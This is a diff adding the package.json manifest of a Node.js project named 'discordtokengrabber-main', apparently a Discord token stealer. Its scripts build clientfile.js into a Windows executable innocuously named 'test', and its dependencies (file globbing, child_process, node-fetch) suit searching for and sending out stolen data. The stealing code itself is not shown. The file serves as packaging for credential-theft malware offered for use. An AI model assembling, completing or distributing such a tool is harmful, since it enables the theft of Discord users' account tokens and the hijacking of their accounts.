@@ -1,0 +1,23 @@
+{
+  "name": "discordtokengrabber-main",
+  "version": "2.0.0",
+  "description": "Fuck off i'm drunk",
+  "main": "clientfile.js",
+  "dependencies": {
+    "buffer-replace": "^1.0.0",
+    "child_process": "^1.0.2",
+    "fs": "0.0.1-security",
+    "glob": "^7.2.0",
+    "nexe": "^4.0.0-beta.19",
+    "node-fetch": "^2.6.6"
+  },
+  "devDependencies": {},
+  "scripts": {
+    "start": "node clientfile.js",
+    "build": "nexe clientfile.js -o test -t windows --build --verbose",
+    "install": "npm i fs node-fetch@2 nexe glob buffer-replace child_process --save"
+  },
+  "author": "!\"𝐍𝐨𝐭.𝐅𝐮𝐛𝐮𝐤𝐢𝐢 †#6900",
+  "license": "ISC"
+}
+
